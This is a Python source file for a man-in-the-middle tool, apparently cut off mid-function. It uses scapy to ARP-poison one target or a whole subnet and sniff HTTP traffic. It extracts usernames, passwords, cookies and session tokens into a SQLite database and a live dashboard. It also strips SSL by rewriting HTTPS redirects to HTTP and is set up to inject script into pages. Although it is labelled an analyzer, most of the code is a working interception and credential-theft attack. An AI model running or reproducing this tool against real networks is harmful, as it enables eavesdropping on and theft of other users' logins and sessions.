#!/usr/bin/env python3

import argparse
import base64
import hashlib
import json
import logging
import os
import re
import secrets
import signal
import socket
import sqlite3
import sys
import threading
import time
from collections import defaultdict, deque
from dataclasses import dataclass, asdict
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional, Dict, List, Set, Tuple, Deque, Any
from urllib.parse import urlparse, parse_qs, quote, unquote

from scapy.all import (
    ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw,
    ICMP, HTTP, Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, rdpcap, CookedLinux
)
from scapy.layers.l2 import arping, getmacbyip
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.sendrecv import AsyncSniffer
import netifaces

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("mitm_analyzer.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("MITM_Analyzer")


@dataclass
class NetworkTarget:
    ip: str
    mac: Optional[str] = None
    hostname: Optional[str] = None
    vendor: Optional[str] = None
    os: Optional[str] = None
    is_wireless: bool = False


@dataclass
class TrafficStats:
    total_packets: int = 0
    http_packets: int = 0
    https_packets: int = 0
    dns_packets: int = 0
    tcp_packets: int = 0
    udp_packets: int = 0
    injected_packets: int = 0
    stripped_ssl: int = 0
    credentials_found: int = 0
    session_hijacks: int = 0
    deauth_packets: int = 0
    started_at: float = time.time()

    def to_dict(self):
        duration = time.time() - self.started_at
        return {
            "total_packets": self.total_packets,
            "http_packets": self.http_packets,
            "https_packets": self.https_packets,
            "dns_packets": self.dns_packets,
            "tcp_packets": self.tcp_packets,
            "udp_packets": self.udp_packets,
            "injected_packets": self.injected_packets,
            "stripped_ssl": self.stripped_ssl,
            "credentials_found": self.credentials_found,
            "session_hijacks": self.session_hijacks,
            "deauth_packets": self.deauth_packets,
            "duration": duration,
            "packets_per_second": self.total_packets / duration if duration > 0 else 0
        }


class RequestTracker:
    def __init__(self, max_size=1000):
        self.requests = deque(maxlen=max_size)
        self.sessions = {}
        self.credentials = []
        self.session_tokens = {}

    def add_request(self, src_ip, method, host, path, user_agent=None, referer=None, cookies=None):
        request = {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "method": method,
            "host": host,
            "path": path,
            "user_agent": user_agent,
            "referer": referer,
            "cookies": cookies
        }
        self.requests.append(request)
        return request

    def add_credential(self, src_ip, host, username, password, method="HTTP"):
        credential = {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "host": host,
            "username": username,
            "password": password,
            "method": method
        }
        self.credentials.append(credential)
        logger.warning(f"Credential found: {username}:{password} @ {host} from {src_ip}")
        return credential

    def track_session(self, src_ip, session_id, host, user_agent=None):
        """Track user sessions for hijacking detection"""
        if session_id not in self.session_tokens:
            self.session_tokens[session_id] = {
                "src_ip": src_ip,
                "host": host,
                "user_agent": user_agent,
                "first_seen": time.time(),
                "last_seen": time.time(),
                "hijacked": False
            }
        else:
            self.session_tokens[session_id]["last_seen"] = time.time()

        return self.session_tokens[session_id]


class DatabaseManager:
    def __init__(self, db_path="mitm_analysis.db"):
        self.db_path = db_path
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        # Create requests table
        c.execute('''CREATE TABLE IF NOT EXISTS requests
                     (id INTEGER PRIMARY KEY, timestamp REAL, src_ip TEXT, method TEXT, 
                      host TEXT, path TEXT, user_agent TEXT, referer TEXT, cookies TEXT)''')

        # Create credentials table
        c.execute('''CREATE TABLE IF NOT EXISTS credentials
                     (id INTEGER PRIMARY KEY, timestamp REAL, src_ip TEXT, host TEXT, 
                      username TEXT, password TEXT, method TEXT)''')

        # Create packets table
        c.execute('''CREATE TABLE IF NOT EXISTS packets
                     (id INTEGER PRIMARY KEY, timestamp REAL, src_ip TEXT, dst_ip TEXT, 
                      protocol TEXT, length INTEGER, info TEXT)''')

        # Create hosts table
        c.execute('''CREATE TABLE IF NOT EXISTS hosts
                     (id INTEGER PRIMARY KEY, ip TEXT UNIQUE, mac TEXT, hostname TEXT, 
                      vendor TEXT, os TEXT, first_seen REAL, last_seen REAL, is_wireless INTEGER)''')

        # Create sessions table
        c.execute('''CREATE TABLE IF NOT EXISTS sessions
                     (id INTEGER PRIMARY KEY, session_id TEXT, src_ip TEXT, host TEXT,
                      user_agent TEXT, first_seen REAL, last_seen REAL, hijacked INTEGER)''')

        # Create OUI vendor database
        c.execute('''CREATE TABLE IF NOT EXISTS oui_vendors
                     (oui TEXT PRIMARY KEY, vendor TEXT)''')

        # Initialize OUI database if empty
        c.execute("SELECT COUNT(*) FROM oui_vendors")
        if c.fetchone()[0] == 0:
            self.init_oui_database(c)

        conn.commit()
        conn.close()

    def init_oui_database(self, cursor):
        """Initialize OUI database with some common vendors"""
        common_ouis = [
            ("000C29", "VMware"),
            ("001C42", "Dell"),
            ("002590", "Supermicro"),
            ("080027", "PCS Systemtechnik"),
            ("0C4DE9", "Apple"),
            ("145A05", "Apple"),
            ("1C1B0D", "Apple"),
            ("2C4401", "Samsung"),
            ("3C5AB4", "Google"),
            ("5C3C27", "Samsung"),
            ("7C6D62", "Apple"),
            ("9C29AC", "Apple"),
            ("A4B197", "Apple"),
            ("B827EB", "Raspberry Pi"),
            ("DCA4CA", "Apple"),
            ("F0DCE2", "Apple"),
            ("F4F5D8", "Google"),
            ("FCFC48", "Apple"),
            ("001122", "Cisco"),
            ("005056", "VMware"),
            ("000E38", "Hewlett Packard"),
            ("0016CB", "Apple"),
            ("001E65", "Apple"),
            ("0026BB", "Apple"),
            ("003065", "Apple"),
            ("08CC68", "Cisco"),
            ("0CBC9F", "Apple"),
            ("10DDB1", "Apple"),
            ("14BD61", "Apple"),
            ("18AF61", "Apple"),
            ("1C5CF2", "Apple"),
            ("20A2E4", "Apple"),
            ("24A495", "Apple"),
            ("28CFDA", "Apple"),
            ("34C059", "Apple"),
            ("3C0754", "Apple"),
            ("40A6D9", "Apple"),
            ("44D884", "Apple"),
            ("4C8D79", "Apple"),
            ("546009", "Apple"),
            ("5C95AE", "Apple"),
            ("60FEC5", "Apple"),
            ("6C4008", "Apple"),
            ("78A3E4", "Apple"),
            ("843835", "Apple"),
            ("885395", "Apple"),
            ("90769F", "Samsung"),
            ("9C293F", "Apple"),
            ("A0EDCD", "Apple"),
            ("AC87A3", "Apple"),
            ("B065BD", "Apple"),
            ("B8E856", "Apple"),
            ("C02BFC", "Apple"),
            ("C82A14", "Apple"),
            ("D0A637", "Apple"),
            ("D8BB2C", "Apple"),
            ("E0ACCB", "Apple"),
            ("EC3586", "Apple"),
            ("F0DBF8", "Apple"),
            ("FC253F", "Apple")
        ]

        cursor.executemany("INSERT INTO oui_vendors (oui, vendor) VALUES (?, ?)", common_ouis)

    def get_vendor_from_oui(self, oui):
        """Get vendor from OUI database"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT vendor FROM oui_vendors WHERE oui=?", (oui,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else "Unknown"

    def save_request(self, request):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO requests (timestamp, src_ip, method, host, path, user_agent, referer, cookies)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (request['timestamp'], request['src_ip'], request['method'], request['host'],
                   request['path'], request['user_agent'], request['referer'],
                   json.dumps(request['cookies']) if request['cookies'] else None))
        conn.commit()
        conn.close()

    def save_credential(self, credential):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO credentials (timestamp, src_ip, host, username, password, method)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (credential['timestamp'], credential['src_ip'], credential['host'],
                   credential['username'], credential['password'], credential['method']))
        conn.commit()
        conn.close()

    def save_packet(self, packet_info):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO packets (timestamp, src_ip, dst_ip, protocol, length, info)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (packet_info['timestamp'], packet_info['src_ip'], packet_info['dst_ip'],
                   packet_info['protocol'], packet_info['length'], packet_info['info']))
        conn.commit()
        conn.close()

    def save_host(self, host):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        # Check if host exists
        c.execute("SELECT id FROM hosts WHERE ip=?", (host.ip,))
        result = c.fetchone()

        if result:
            # Update existing host
            c.execute('''UPDATE hosts SET mac=?, hostname=?, vendor=?, os=?, last_seen=?, is_wireless=?
                         WHERE ip=?''',
                      (host.mac, host.hostname, host.vendor, host.os, time.time(),
                       1 if host.is_wireless else 0, host.ip))
        else:
            # Insert new host
            c.execute('''INSERT INTO hosts (ip, mac, hostname, vendor, os, first_seen, last_seen, is_wireless)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (host.ip, host.mac, host.hostname, host.vendor, host.os,
                       time.time(), time.time(), 1 if host.is_wireless else 0))

        conn.commit()
        conn.close()

    def save_session(self, session):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        # Check if session exists
        c.execute("SELECT id FROM sessions WHERE session_id=?", (session['session_id'],))
        result = c.fetchone()

        if result:
            # Update existing session
            c.execute('''UPDATE sessions SET src_ip=?, host=?, user_agent=?, last_seen=?, hijacked=?
                         WHERE session_id=?''',
                      (session['src_ip'], session['host'], session['user_agent'],
                       session['last_seen'], 1 if session['hijacked'] else 0, session['session_id']))
        else:
            # Insert new session
            c.execute('''INSERT INTO sessions (session_id, src_ip, host, user_agent, first_seen, last_seen, hijacked)
                         VALUES (?, ?, ?, ?, ?, ?, ?)''',
                      (session['session_id'], session['src_ip'], session['host'],
                       session['user_agent'], session['first_seen'], session['last_seen'],
                       1 if session['hijacked'] else 0))

        conn.commit()
        conn.close()


class LiveAnalysisHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.auth_tokens = kwargs.pop('auth_tokens', {})
        self.auth_enabled = kwargs.pop('auth_enabled', False)
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Check authentication if enabled
        if self.auth_enabled and not self.authenticate():
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="MITM Dashboard"')
            self.end_headers()
            self.wfile.write(b'Authentication required')
            return

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.serve_dashboard()
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.serve_stats()
        elif self.path == '/requests':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.serve_requests()
        elif self.path == '/credentials':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.serve_credentials()
        elif self.path == '/hosts':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.serve_hosts()
        elif self.path == '/sessions':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.serve_sessions()
        else:
            self.send_response(404)
            self.end_headers()

    def authenticate(self):
        """Check HTTP Basic Authentication"""
        auth_header = self.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Basic '):
            return False

        auth_decoded = base64.b64decode(auth_header[6:]).decode('utf-8')
        username, password = auth_decoded.split(':', 1)

        # Check against stored tokens
        expected_password = self.auth_tokens.get(username)
        return expected_password and password == expected_password

    def serve_dashboard(self):
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>MITM Analysis Dashboard</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
                .container { max-width: 1200px; margin: 0 auto; }
                .card { background: white; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin: 10px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                .stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
                .stat-item { background: #e8f4f8; padding: 15px; border-radius: 6px; border-left: 4px solid #2196F3; }
                .stat-item.warning { background: #ffecb3; border-left-color: #ffc107; }
                .stat-item.danger { background: #ffcdd2; border-left-color: #f44336; }
                table { width: 100%; border-collapse: collapse; margin-top: 10px; }
                th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                th { background-color: #f2f2f2; position: sticky; top: 0; }
                tr:nth-child(even) { background-color: #f9f9f9; }
                tr:hover { background-color: #f1f1f1; }
                h1 { color: #333; border-bottom: 2px solid #2196F3; padding-bottom: 10px; }
                h2 { color: #444; margin-top: 0; }
                .badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }
                .badge.success { background: #4CAF50; color: white; }
                .badge.warning { background: #FF9800; color: white; }
                .badge.danger { background: #F44336; color: white; }
                .refresh-btn { background: #2196F3; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin: 5px; }
                .refresh-btn:hover { background: #0b7dda; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>MITM Analysis Dashboard</h1>

                <div class="card">
                    <h2>Statistics <button class="refresh-btn" onclick="updateStats()">Refresh</button></h2>
                    <div id="stats" class="stats"></div>
                </div>

                <div class="card">
                    <h2>Recent Requests <button class="refresh-btn" onclick="updateRequests()">Refresh</button></h2>
                    <div id="requests"></div>
                </div>

                <div class="card">
                    <h2>Discovered Sessions <button class="refresh-btn" onclick="updateSessions()">Refresh</button></h2>
                    <div id="sessions"></div>
                </div>

                <div class="card">
                    <h2>Credentials Found <button class="refresh-btn" onclick="updateCredentials()">Refresh</button></h2>
                    <div id="credentials"></div>
                </div>

                <div class="card">
                    <h2>Discovered Hosts <button class="refresh-btn" onclick="updateHosts()">Refresh</button></h2>
                    <div id="hosts"></div>
                </div>
            </div>

            <script>
                function updateStats() {
                    fetch('/stats')
                        .then(response => response.json())
                        .then(data => {
                            let statsHtml = '';
                            const stats = [
                                {key: 'total_packets', label: 'Total Packets', class: ''},
                                {key: 'http_packets', label: 'HTTP Packets', class: ''},
                                {key: 'https_packets', label: 'HTTPS Packets', class: 'warning'},
                                {key: 'dns_packets', label: 'DNS Packets', class: ''},
                                {key: 'tcp_packets', label: 'TCP Packets', class: ''},
                                {key: 'udp_packets', label: 'UDP Packets', class: ''},
                                {key: 'injected_packets', label: 'Injected Packets', class: 'success'},
                                {key: 'stripped_ssl', label: 'SSL Stripped', class: 'warning'},
                                {key: 'credentials_found', label: 'Credentials Found', class: 'danger'},
                                {key: 'session_hijacks', label: 'Session Hijacks', class: 'danger'},
                                {key: 'deauth_packets', label: 'Deauth Packets', class: 'warning'},
                                {key: 'duration', label: 'Duration (s)', class: ''},
                                {key: 'packets_per_second', label: 'Packets/s', class: ''}
                            ];

                            stats.forEach(stat => {
                                const value = typeof data[stat.key] === 'number' ? 
                                    data[stat.key].toFixed(2) : data[stat.key];
                                statsHtml += `<div class="stat-item ${stat.class}"><strong>${stat.label}:</strong> ${value}</div>`;
                            });
                            document.getElementById('stats').innerHTML = statsHtml;
                        });
                }

                function updateRequests() {
                    fetch('/requests')
                        .then(response => response.json())
                        .then(data => {
                            if (data.length === 0) {
                                document.getElementById('requests').innerHTML = '<p>No requests captured yet.</p>';
                                return;
                            }

                            let html = '<table><tr><th>Time</th><th>Source</th><th>Method</th><th>Host</th><th>Path</th></tr>';
                            data.slice(0, 10).forEach(req => {
                                const time = new Date(req.timestamp * 1000).toLocaleTimeString();
                                html += `<tr><td>${time}</td><td>${req.src_ip}</td><td>${req.method}</td><td>${req.host}</td><td>${req.path}</td></tr>`;
                            });
                            html += '</table>';
                            document.getElementById('requests').innerHTML = html;
                        });
                }

                function updateSessions() {
                    fetch('/sessions')
                        .then(response => response.json())
                        .then(data => {
                            if (data.length === 0) {
                                document.getElementById('sessions').innerHTML = '<p>No sessions discovered yet.</p>';
                                return;
                            }

                            let html = '<table><tr><th>Session ID</th><th>Source IP</th><th>Host</th><th>User Agent</th><th>Last Seen</th><th>Status</th></tr>';
                            data.forEach(session => {
                                const lastSeen = new Date(session.last_seen * 1000).toLocaleTimeString();
                                const status = session.hijacked ? 
                                    '<span class="badge danger">Hijacked</span>' : 
                                    '<span class="badge success">Active</span>';
                                html += `<tr><td>${session.session_id.substring(0, 12)}...</td><td>${session.src_ip}</td><td>${session.host}</td><td>${session.user_agent}</td><td>${lastSeen}</td><td>${status}</td></tr>`;
                            });
                            html += '</table>';
                            document.getElementById('sessions').innerHTML = html;
                        });
                }

                function updateCredentials() {
                    fetch('/credentials')
                        .then(response => response.json())
                        .then(data => {
                            if (data.length === 0) {
                                document.getElementById('credentials').innerHTML = '<p>No credentials found yet.</p>';
                                return;
                            }

                            let html = '<table><tr><th>Time</th><th>Source</th><th>Host</th><th>Username</th><th>Password</th><th>Method</th></tr>';
                            data.forEach(cred => {
                                const time = new Date(cred.timestamp * 1000).toLocaleTimeString();
                                html += `<tr><td>${time}</td><td>${cred.src_ip}</td><td>${cred.host}</td><td>${cred.username}</td><td>${cred.password}</td><td>${cred.method}</td></tr>`;
                            });
                            html += '</table>';
                            document.getElementById('credentials').innerHTML = html;
                        });
                }

                function updateHosts() {
                    fetch('/hosts')
                        .then(response => response.json())
                        .then(data => {
                            let html = '<table><tr><th>IP</th><th>MAC</th><th>Hostname</th><th>Vendor</th><th>OS</th><th>Wireless</th></tr>';
                            data.forEach(host => {
                                const wireless = host.is_wireless ? 
                                    '<span class="badge success">Yes</span>' : 
                                    '<span class="badge">No</span>';
                                html += `<tr><td>${host.ip}</td><td>${host.mac}</td><td>${host.hostname || 'N/A'}</td><td>${host.vendor || 'Unknown'}</td><td>${host.os || 'Unknown'}</td><td>${wireless}</td></tr>`;
                            });
                            html += '</table>';
                            document.getElementById('hosts').innerHTML = html;
                        });
                }

                // Update all sections every 3 seconds
                setInterval(() => {
                    updateStats();
                    updateRequests();
                    updateSessions();
                    updateCredentials();
                    updateHosts();
                }, 3000);

                // Initial load
                updateStats();
                updateRequests();
                updateSessions();
                updateCredentials();
                updateHosts();
            </script>
        </body>
        </html>
        """
        self.wfile.write(html.encode())

    def serve_stats(self):
        stats = self.server.arper.stats.to_dict()
        self.wfile.write(json.dumps(stats).encode())

    def serve_requests(self):
        requests = list(self.server.arper.request_tracker.requests)
        self.wfile.write(json.dumps(requests[-20:]).encode())  # Last 20 requests

    def serve_credentials(self):
        credentials = self.server.arper.request_tracker.credentials
        self.wfile.write(json.dumps(credentials).encode())

    def serve_hosts(self):
        hosts = [asdict(host) for host in self.server.arper.discovered_hosts.values()]
        self.wfile.write(json.dumps(hosts).encode())

    def serve_sessions(self):
        sessions = list(self.server.arper.request_tracker.session_tokens.values())
        self.wfile.write(json.dumps(sessions).encode())

    def log_message(self, format, *args):
        # Silence the HTTP server logs
        return


class AdvancedARPSpoofer:
    def __init__(self, interface: str, gateway: NetworkTarget, target: Optional[NetworkTarget] = None,
                 config_file: Optional[str] = None):
        self.interface = interface
        self.gateway = gateway
        self.target = target
        self.config = self.load_config(config_file)
        self.stop_event = threading.Event()
        self.stats = TrafficStats()
        self.request_tracker = RequestTracker()
        self.db_manager = DatabaseManager()
        self.discovered_hosts: Dict[str, NetworkTarget] = {}
        self.http_server = None
        self.http_thread = None
        self.sniffer_thread = None
        self.poison_thread = None
        self.wireless_thread = None
        self.injection_rules = self.config.get('injection_rules', [])
        self.credential_patterns = self.config.get('credential_patterns', [
            r'username=([^&]+)',
            r'user=([^&]+)',
            r'email=([^&]+)',
            r'login=([^&]+)',
            r'password=([^&]+)',
            r'pass=([^&]+)',
            r'pwd=([^&]+)'
        ])
        self.session_patterns = self.config.get('session_patterns', [
            r'sessionid=([^&]+)',
            r'jsessionid=([^&]+)',
            r'phpsessid=([^&]+)',
            r'sessid=([^&]+)',
            r'sid=([^&]+)',
            r'token=([^&]+)',
            r'auth=([^&]+)'
        ])

        # Authentication for web dashboard
        self.dashboard_auth = self.config.get('dashboard_auth', {})
        if not self.dashboard_auth:
            # Generate default credentials if none provided
            username = "admin"
            password = secrets.token_urlsafe(12)
            self.dashboard_auth = {username: password}
            logger.warning(f"Generated dashboard credentials: {username}:{password}")

        conf.iface = interface
        conf.verb = 0

        # Get MAC addresses if not provided
        if not self.gateway.mac:
            self.gateway.mac = self.get_mac(self.gateway.ip)
            if self.gateway.mac:
                self.gateway.vendor = self.get_vendor_from_mac(self.gateway.mac)

        if self.target and not self.target.mac:
            self.target.mac = self.get_mac(self.target.ip)
            if self.target.mac:
                self.target.vendor = self.get_vendor_from_mac(self.target.mac)

        if not self.gateway.mac:
            logger.error("Failed to get gateway MAC address")
            sys.exit(1)

        # Add gateway to discovered hosts
        self.discovered_hosts[gateway.ip] = gateway
        self.db_manager.save_host(gateway)

        if target:
            self.discovered_hosts[target.ip] = target
            self.db_manager.save_host(target)

    def load_config(self, config_file: Optional[str] = None) -> Dict:
        """Load configuration from JSON file or use defaults."""
        default_config = {
            "injection_rules": [
                {
                    "pattern": "</body>",
                    "injection": "<script>console.log('MITM Injection: Session monitored')</script></body>",
                    "description": "Add JavaScript console log before body end tag"
                }
            ],
            "credential_patterns": [
                r'username=([^&]+)',
                r'user=([^&]+)',
                r'email=([^&]+)',
                r'login=([^&]+)',
                r'password=([^&]+)',
                r'pass=([^&]+)',
                r'pwd=([^&]+)'
            ],
            "session_patterns": [
                r'sessionid=([^&]+)',
                r'jsessionid=([^&]+)',
                r'phpsessid=([^&]+)',
                r'sessid=([^&]+)',
                r'sid=([^&]+)',
                r'token=([^&]+)',
                r'auth=([^&]+)'
            ],
            "monitor_all_hosts": False,
            "capture_dns": True,
            "detect_deauth": True,
            "wireless_monitoring": False,
            "http_port": 8080,
            "dashboard_auth": {},
            "dashboard_enable_auth": True
        }

        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_config = json.load(f)
                    # Merge with defaults
                    for key, value in loaded_config.items():
                        default_config[key] = value
            except Exception as e:
                logger.error(f"Error loading config file: {e}")

        return default_config

    def get_mac(self, ip_address: str) -> Optional[str]:
        """Get MAC address for given IP using ARP ping."""
        try:
            # First try scapy's built-in function
            mac = getmacbyip(ip_address)
            if mac:
                return mac

            # Fallback to ARP ping
            ans, _ = arping(ip_address, timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            logger.error(f"MAC resolution failed for {ip_address}: {e}")
        return None

    def get_vendor_from_mac(self, mac_address: str) -> Optional[str]:
        """Get vendor information from MAC address using OUI database."""
        if not mac_address or mac_address.lower() in ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00']:
            return "Unknown"

        # Extract OUI (first 3 bytes)
        oui = mac_address.replace(':', '').upper()[:6]
        return self.db_manager.get_vendor_from_oui(oui)

    def network_discovery(self):
        """Discover hosts on the network using ARP scanning."""
        logger.info("Starting network discovery...")

        # Get network CIDR from gateway IP
        gateway_ip = self.gateway.ip
        ip_parts = gateway_ip.split('.')
        network_cidr = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

        # Create ARP request packet
        arp_request = ARP(pdst=network_cidr)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        try:
            # Send ARP requests and get responses
            answered, _ = srp(arp_request_broadcast, timeout=2, verbose=0)

            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc
                vendor = self.get_vendor_from_mac(mac)

                if ip not in self.discovered_hosts:
                    host = NetworkTarget(ip=ip, mac=mac, vendor=vendor)
                    self.discovered_hosts[ip] = host
                    self.db_manager.save_host(host)
                    logger.info(f"Discovered host: {ip} ({mac}) - {vendor}")

        except Exception as e:
            logger.error(f"Network discovery failed: {e}")

    def poison_target(self, target_ip: str, target_mac: str):
        """ARP poisoning for a specific target."""
        poison_target = ARP(
            op=2, psrc=self.gateway.ip, pdst=target_ip, hwdst=target_mac
        )
        poison_gateway = ARP(
            op=2, psrc=target_ip, pdst=self.gateway.ip, hwdst=self.gateway.mac
        )

        logger.info(f"Starting ARP poisoning for {target_ip} [CTRL-C to stop]")
        while not self.stop_event.is_set():
            try:
                send(poison_target, verbose=0)
                send(poison_gateway, verbose=0)
                time.sleep(2)
            except Exception as e:
                logger.error(f"Poisoning error for {target_ip}: {e}")
                break
        logger.info(f"ARP poisoning stopped for {target_ip}")

    def start_arp_poisoning(self):
        """Start ARP poisoning for all targets."""
        if self.target:
            # Poison specific target
            self.poison_thread = threading.Thread(
                target=self.poison_target,
                args=(self.target.ip, self.target.mac)
            )
            self.poison_thread.start()
        elif self.config.get("monitor_all_hosts", False):
            # Poison all discovered hosts
            for ip, host in self.discovered_hosts.items():
                if ip != self.gateway.ip and host.mac:
                    t = threading.Thread(
                        target=self.poison_target,
                        args=(ip, host.mac)
                    )
                    t.start()
        else:
            logger.error("No target specified and monitor_all_hosts is disabled")

    def restore_network(self):
        """Restore network by sending correct ARP replies."""
        logger.info("Restoring network configuration...")

        if self.target:
            # Restore specific target
            send(
                ARP(
                    op=2,
                    psrc=self.gateway.ip,
                    hwsrc=self.gateway.mac,
                    pdst=self.target.ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                ),
                count=5,
                verbose=0,
            )
            send(
                ARP(
                    op=2,
                    psrc=self.target.ip,
                    hwsrc=self.target.mac,
                    pdst=self.gateway.ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                ),
                count=5,
                verbose=0,
            )
        elif self.config.get("monitor_all_hosts", False):
            # Restore all discovered hosts
            for ip, host in self.discovered_hosts.items():
                if ip != self.gateway.ip and host.mac:
                    send(
                        ARP(
                            op=2,
                            psrc=self.gateway.ip,
                            hwsrc=self.gateway.mac,
                            pdst=ip,
                            hwdst="ff:ff:ff:ff:ff:ff",
                        ),
                        count=3,
                        verbose=0,
                    )

        logger.info("Network restored")

    def extract_credentials(self, payload: str) -> List[Tuple[str, str]]:
        """Extract credentials from HTTP payload."""
        credentials = []

        for pattern in self.credential_patterns:
            matches = re.findall(pattern, payload)
            if matches:
                # Simple heuristic: if we find username-like and password-like patterns
                user_patterns = [r'username=([^&]+)', r'user=([^&]+)', r'email=([^&]+)', r'login=([^&]+)']
                pass_patterns = [r'password=([^&]+)', r'pass=([^&]+)', r'pwd=([^&]+)']

                users = []
                passes = []

                for upat in user_patterns:
                    users.extend(re.findall(upat, payload))

                for ppat in pass_patterns:
                    passes.extend(re.findall(ppat, payload))

                if users and passes:
                    # Try to match the most likely pair
                    credentials.append((users[0], passes[0]))

        return credentials

    def extract_session_tokens(self, payload: str) -> List[str]:
        """Extract session tokens from HTTP payload."""
        sessions = []

        for pattern in self.session_patterns:
            matches = re.findall(pattern, payload, re.IGNORECASE)
            sessions.extend(matches)

        return sessions

    def detect_session_hijacking(self, src_ip: str, session_id: str, user_agent: str, host: str) -> bool:
        """Detect potential session hijacking attempts."""
        if session_id in self.request_tracker.session_tokens:
            existing_session = self.request_tracker.session_tokens[session_id]

            # Check if session is being used from a different IP or User-Agent
            if (existing_session["src_ip"] != src_ip or
                    existing_session["user_agent"] != user_agent):
                # Mark as hijacked
                existing_session["hijacked"] = True
                self.stats.session_hijacks += 1
                self.db_manager.save_session(existing_session)

                logger.warning(f"Session hijacking detected! Session {session_id[:12]}... "
                               f"from {existing_session['src_ip']} to {src_ip}")
                return True

        return False

    def process_http_request(self, packet) -> bool:
        """Process HTTP requests for analysis and injection."""
        if not packet.haslayer(Raw):
            return False

        try:
            load = packet[Raw].load.decode(errors='ignore')
            src_ip = packet[IP].src

            # Check if this is an HTTP request
            if any(method in load for method in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']):
                self.stats.http_packets += 1

                # Extract HTTP headers
                headers = {}
                lines = load.split('\r\n')
                method, path, version = lines[0].split(' ', 2)

                for line in lines[1:]:
                    if ': ' in line:
                        key, value = line.split(': ', 1)
                        headers[key.lower()] = value

                host = headers.get('host', '')
                user_agent = headers.get('user-agent', '')
                referer = headers.get('referer', '')
                cookie_header = headers.get('cookie', '')

                # Parse cookies
                cookies = {}
                if cookie_header:
                    for cookie in cookie_header.split(';'):
                        if '=' in cookie:
                            key, value = cookie.split('=', 1)
                            cookies[key.strip()] = value.strip()

                # Track this request
                request = self.request_tracker.add_request(
                    src_ip, method, host, path, user_agent, referer, cookies
                )
                self.db_manager.save_request(request)

                # Extract session tokens
                session_tokens = self.extract_session_tokens(load)
                for token in session_tokens:
                    session = self.request_tracker.track_session(src_ip, token, host, user_agent)
                    self.db_manager.save_session(session)

                # Extract credentials from POST data
                if method == 'POST' and 'content-type' in headers and 'application/x-www-form-urlencoded' in headers[
                    'content-type'].lower():
                    credentials = self.extract_credentials(load)
                    for username, password in credentials:
                        credential = self.request_tracker.add_credential(
                            src_ip, host, username, password, "HTTP POST"
                        )
                        self.db_manager.save_credential(credential)
                        self.stats.credentials_found += 1

                logger.info(f"HTTP {method} {host}{path} from {src_ip}")
                return False

            # Check if this is an HTTP response
            elif 'HTTP/' in load and ('Content-Type:' in load or 'content-type:' in load):
                # SSL stripping: Detect HTTPS redirects and modify them
                if 'Location: https://' in load:
                    modified_load = load.replace('Location: https://', 'Location: http://')

                    # Create a new packet with the modified content
                    new_packet = IP(packet[IP])
                    del new_packet[TCP].chksum
                    del new_packet[IP].chksum

                    if new_packet.haslayer(Raw):
                        new_packet[Raw].load = modified_load.encode()

                    send(new_packet, verbose=0)
                    logger.info(f"SSL Stripping: Redirected HTTPS to HTTP for {src_ip}")
                    self.stats.stripped_ssl += 1
                    return True

                # MITM Injection: Inject content into HTTP responses
